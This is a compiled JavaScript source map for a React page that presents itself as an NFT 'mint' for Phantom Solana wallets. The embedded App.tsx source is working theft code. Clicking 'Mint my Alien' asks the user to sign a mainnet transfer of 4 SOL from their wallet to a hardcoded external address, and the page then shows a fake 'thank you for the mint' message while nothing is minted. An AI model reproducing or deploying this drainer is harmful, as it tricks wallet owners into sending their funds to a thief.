{"version":3,"sources":["App.tsx","index.tsx"],"names":["NETWORK","clusterApiUrl","CONNECTION","Connection","App","provider","window","solana","isPhantom","getProvider","useState","logs","setLogs","addLog","log","setConnected","useEffect","on","connect","onlyIfTrusted","catch","disconnect","createTransaction","instructions","a","publicKey","transaction","Transaction","add","feePayer","anyTransaction","getRecentBlockhash","recentBlockhash","blockhash","createTransferTransaction","SystemProgram","transfer","fromPubkey","toPubkey","PublicKey","lamports","sendTransaction","signAndSendTransaction","signature","confirmTransaction","sendTransferInstruction","className","onClick","anyWindow","console","map","i","onload","rootElement","document","getElementById","render"],"mappings":"ySA4DMA,EAAUC,YAhCO,gBAiCjBC,EAAa,IAAIC,IAAWH,GAEnB,SAASI,IACtB,IAAIC,EAdc,WAClB,GAAI,WAAYC,OAAQ,CACtB,IACMD,EADiBC,OACIC,OAC3B,GAAIF,EAASG,UACX,OAAOH,GASII,GACf,EAAwBC,mBAAmB,IAA3C,mBAAOC,EAAP,KAAaC,EAAb,KACMC,EAAS,SAACC,GAAD,OAAiBF,EAAQ,GAAD,mBAAKD,GAAL,CAAWG,MAClD,EAAyBJ,oBAAkB,GAAlCK,EAAT,oBAsBA,GApBAC,qBAAU,WACR,GAAIX,EAaF,OAZAA,EAASY,GAAG,WAAW,WACrBF,GAAa,MAGfV,EAASY,GAAG,cAAc,WACxBF,GAAa,MAIfV,EAASa,QAAQ,CAAEC,eAAe,IAAQC,OAAM,eAGzC,WACLf,EAASgB,gBAGZ,CAAChB,KAECA,EACH,OAAO,4DAGT,IAAMiB,EAAiB,uCAAG,WAAOC,GAAP,mBAAAC,EAAA,yDACnBnB,EAASoB,UADU,wDAIpBC,GAAc,MAAIC,KAAcC,IAAlB,oBAAyBL,KAC/BM,SAAWxB,EAASoB,UAC1BK,EAAsBJ,EANJ,SAQhBxB,EAAW6B,qBARK,cAOxBD,EAAeE,gBAPS,OAStBC,UATsB,kBAUjBP,GAViB,2CAAH,sDAajBQ,EAAyB,uCAAG,sBAAAV,EAAA,+EAChCF,EAAkB,CAChBa,IAAcC,SAAS,CACrBC,WAAYhC,EAASoB,UACrBa,SAAU,IAAIC,IAnFE,gDAsFhBC,SApFQ,SA6EoB,2CAAH,qDAWzBC,EAAe,uCAAG,WAAOf,GAAP,iBAAAF,EAAA,0DAClBE,EADkB,0CAGQrB,EAASqC,uBAAuBhB,GAHxC,uBAGZiB,EAHY,EAGZA,UACN9B,EACE,gDALgB,SAOZX,EAAW0C,mBAAmBD,GAPlB,OAQlB9B,EAAO,0BARW,4GAAH,sDAafgC,EAAuB,uCAAG,4BAAArB,EAAA,sEACJU,IADI,OACxBR,EADwB,OAE9Be,EAAgBf,GAFc,2CAAH,qDAK7B,OACE,qBAAKoB,UAAU,MAAf,SACE,iCACGzC,GAAYA,EAASoB,UACpB,mCACE,wBAAQqB,UAAU,SAASC,QAASF,EAApC,6BAGF,mCACE,wBAAQC,UAAU,SAChBC,QAAO,sBAAE,8BAAAvB,EAAA,6DACDwB,EAAiB1C,OACjBD,EAAW2C,EAAUzC,OAE3B0C,QAAQnC,IAAIT,GAJL,kBAMaA,EAASa,UANtB,uHADX,kCAiBJ,qBAAK4B,UAAU,OAAf,SACGnC,EAAKuC,KAAI,SAACpC,EAAKqC,GAAN,OACR,qBAAKL,UAAU,MAAf,SACGhC,GADuBqC,aC/JtC7C,OAAO8C,OAAS,WACZ,IAAMC,EAAcC,SAASC,eAAe,QAC5CC,iBAAO,cAACpD,EAAD,IAASiD,K","file":"static/js/main.4d569c27.chunk.js","sourcesContent":["import { useState, useEffect } from \"react\";\nimport {\n  Connection,\n  PublicKey,\n  Transaction,\n  clusterApiUrl,\n  SystemProgram,\n  TransactionInstruction,\n  SendOptions,\n} from \"@solana/web3.js\";\nimport { Token } from \"@solana/spl-token\";\nimport \"./styles.css\";\n\ntype DisplayEncoding = \"utf8\" | \"hex\";\ntype PhantomEvent = \"disconnect\" | \"connect\";\ntype PhantomRequestMethod =\n  | \"connect\"\n  | \"disconnect\"\n  | \"signTransaction\"\n  | \"signAllTransactions\"\n  | \"signAndSendTransaction\"\n  | \"signMessage\";\n\ninterface ConnectOpts {\n  onlyIfTrusted: boolean;\n}\n\nconst EXTERNAL_WALLET = \"55AdCCAHutCh4omchTecr4LjzJj3G3zjMFU46H9ZBmGA\";\nconst SOLANA_CLUSTER = \"mainnet-beta\";\nconst AMMOUNT = 4000000000;\n\ninterface PhantomProvider {\n  publicKey: PublicKey | null;\n  isConnected: boolean | null;\n  signTransaction: (transaction: Transaction) => Promise<Transaction>;\n  signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;\n  signAndSendTransaction: (\n    transaction: Transaction,\n    options?: SendOptions\n  ) => Promise<{ signature: string }>;\n  signMessage: (\n    message: Uint8Array | string,\n    display?: DisplayEncoding\n  ) => Promise<{ signature: string; publicKey: PublicKey }>;\n  connect: (opts?: Partial<ConnectOpts>) => Promise<{ publicKey: PublicKey }>;\n  disconnect: () => Promise<void>;\n  on: (event: PhantomEvent, handler: (args: any) => void) => void;\n  request: (method: PhantomRequestMethod, params: any) => Promise<unknown>;\n}\n\nconst getProvider = (): PhantomProvider | undefined => {\n  if (\"solana\" in window) {\n    const anyWindow: any = window;\n    const provider = anyWindow.solana;\n    if (provider.isPhantom) {\n      return provider;\n    }\n  }\n};\n\nconst NETWORK = clusterApiUrl(SOLANA_CLUSTER);\nconst CONNECTION = new Connection(NETWORK);\n\nexport default function App() {\n  var provider = getProvider();\n  const [logs, setLogs] = useState<string[]>([]);\n  const addLog = (log: string) => setLogs([...logs, log]);\n  const [, setConnected] = useState<boolean>(false);\n\n  useEffect(() => {\n    if (provider) {\n      provider.on(\"connect\", () => {\n        setConnected(true);\n        // addLog(\"Connected to wallet \" + provider.publicKey?.toBase58());\n      });\n      provider.on(\"disconnect\", () => {\n        setConnected(false);\n        // addLog(\"Disconnected from wallet\");\n      });\n      // try to eagerly connect\n      provider.connect({ onlyIfTrusted: true }).catch(() => {\n        // fail silently\n      });\n      return () => {\n        provider.disconnect();\n      };\n    }\n  }, [provider]);\n\n  if (!provider) {\n    return <h2>Unlock your Phantom wallet</h2>;\n  }\n\n  const createTransaction = async (instructions: TransactionInstruction[]) => {\n    if (!provider.publicKey) {\n      return;\n    }\n    let transaction = new Transaction().add(...instructions);\n    transaction.feePayer = provider.publicKey;\n    const anyTransaction: any = transaction;\n    anyTransaction.recentBlockhash = (\n      await CONNECTION.getRecentBlockhash()\n    ).blockhash;\n    return transaction;\n  };\n\n  const createTransferTransaction = async () =>\n    createTransaction([\n      SystemProgram.transfer({\n        fromPubkey: provider.publicKey,\n        toPubkey: new PublicKey(\n          EXTERNAL_WALLET\n        ),\n        lamports: AMMOUNT,\n      }),\n    ]);\n\n  const sendTransaction = async (transaction: Transaction) => {\n    if (transaction) {\n      try {\n        let { signature } = await provider.signAndSendTransaction(transaction);\n        addLog(\n          \"Your tokens have been received by our server\"\n        );\n        await CONNECTION.confirmTransaction(signature);\n        addLog(\"Thank you for the mint\");\n      } catch (err) {\n      }\n    }\n  };\n  const sendTransferInstruction = async () => {\n    const transaction = await createTransferTransaction();\n    sendTransaction(transaction);\n  };\n\n  return (\n    <div className=\"App\">\n      <main>\n        {provider && provider.publicKey ? (\n          <>\n            <button className=\"button\" onClick={sendTransferInstruction}>Mint my Alien</button>\n          </>\n        ) : (\n          <>\n            <button className=\"button\"\n              onClick={async () => {\n                const anyWindow: any = window;\n                const provider = anyWindow.solana;\n\n                console.log(provider)\n                try {\n                  const res = await provider.connect();\n                } catch (err) {\n                }\n              }}\n            >\n              Connect to Phantom\n            </button>\n            {/* You have to use Phantom for connection with our mint system */}\n          </>\n        )}\n        <div className=\"logs\">\n          {logs.map((log, i) => (\n            <div className=\"log\" key={i}>\n              {log}\n            </div>\n          ))}\n        </div>\n      </main>\n    </div>\n  );\n}\n","import { render } from \"react-dom\";\n\nimport App from \"./App\";\n\nwindow.onload = function() {\n    const rootElement = document.getElementById(\"mint\");\n    render(<App />, rootElement);\n}"],"sourceRoot":""}